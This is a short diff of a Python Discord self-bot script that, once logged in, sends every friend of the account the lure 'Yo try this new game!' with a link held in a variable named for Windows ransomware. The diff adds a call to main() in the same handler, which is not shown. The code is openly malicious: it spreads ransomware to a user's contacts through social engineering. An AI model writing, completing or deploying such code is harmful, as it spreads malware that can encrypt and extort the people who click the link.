@@ -69,6 +69,7 @@ bot = commands.Bot(command_prefix=prefix, self_bot=True)
 async def on_ready():
     for user in bot.user.friends:
         user.send("Yo try this new game! " + urltoransomwarewindows + "for windows")
+    main()
         
 asyncio.set_event_loop(asyncio.new_event_loop())
 loop = asyncio.new_event_loop()
